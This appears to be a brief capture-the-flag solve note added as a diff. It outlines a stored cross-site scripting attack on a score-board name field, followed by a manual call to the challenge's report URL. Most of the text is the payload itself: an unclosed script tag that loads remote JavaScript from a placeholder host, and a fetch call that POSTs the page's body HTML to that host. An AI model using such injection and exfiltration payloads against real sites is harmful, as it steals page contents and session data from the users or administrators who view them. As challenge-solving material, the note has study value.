@@ -1,0 +1,16 @@
+High-level overview of solve:
+
+ - get a score, idc
+ - set name to attached [1]
+ - check js for report function, manually call report url
+
+
+[1] injection assuming [2] is at https://foo.bar/baz:
+```html
+<script src="https://foo.bar/baz" nom=
+```
+
+[2] script at foo.bar/baz (assuming you have https://foo.bar/xyzzy )
+```js
+fetch('https://foo.bar/xyzzy', { method: 'POST', mode: 'no-cors', body: document.body.innerHTML })
+```
